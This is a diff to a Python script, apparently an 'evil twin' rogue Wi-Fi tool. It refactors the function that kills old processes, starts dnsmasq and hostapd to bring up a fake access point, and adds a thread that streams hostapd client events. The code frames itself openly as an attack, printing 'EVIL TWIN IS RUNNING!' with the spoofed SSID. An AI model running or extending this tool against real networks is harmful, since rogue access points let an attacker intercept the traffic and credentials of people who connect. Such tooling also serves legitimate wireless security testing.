@@ -546,42 +546,55 @@ def setup_iptables(iface):
 #####################################################################
 
 def start_attack():
-    """Kills previous processes and starts dnsmasq and hostapd."""
+    """Kills previous processes and starts dnsmasq and hostapd (Wi-Fi logs only)."""
     global dnsmasq_proc, hostapd_proc
     print("[*] Starting the attack...")
-    
+
     subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
-    
+
     try:
         print("[*] Starting dnsmasq...")
-        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
+        dnsmasq_proc = subprocess.Popen(
+            ['dnsmasq', '-C', 'dnsmasq.conf', '-d'],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+
         print("[*] Starting hostapd...")
-        if script_args.band == "5":
-            hostapd_proc = subprocess.Popen(['hostapd', 'hostapd_5.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        else:
-            hostapd_proc = subprocess.Popen(['hostapd', 'hostapd_24.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        hostapd_conf = 'hostapd_5.conf' if script_args.band == "5" else 'hostapd_24.conf'
+        hostapd_proc = subprocess.Popen(
+            ['hostapd', hostapd_conf],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+
         time.sleep(2)
-        
+
         if dnsmasq_proc.poll() is not None:
-            stdout, stderr = dnsmasq_proc.communicate()
+            out = dnsmasq_proc.stdout.read() if dnsmasq_proc.stdout else ""
             print("[-] dnsmasq failed to start. Error output:")
-            print(stderr.decode().strip())
+            print((out or "").strip())
             raise Exception("dnsmasq failed.")
 
         if hostapd_proc.poll() is not None:
-            stdout, stderr = hostapd_proc.communicate()
+            out = hostapd_proc.stdout.read() if hostapd_proc.stdout else ""
             print("[-] hostapd failed to start. Error output:")
-            print(stderr.decode().strip())
+            print((out or "").strip())
             raise Exception("hostapd failed.")
-            
+
+        threading.Thread(
+            target=stream_hostapd_events,
+            args=(script_args.iface, hostapd_proc),
+            daemon=True
+        ).start()
+
         print("\n[+] EVIL TWIN IS RUNNING!")
         print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
         print("[+] Press CTRL+C to stop the attack and clean up.")
-        
-    except Exception as e:
-        print(f"[-] Failed to start attack processes.")
+
+    except Exception:
+        print("[-] Failed to start attack processes.")
         cleanup(0, 0)
         sys.exit(1)
 
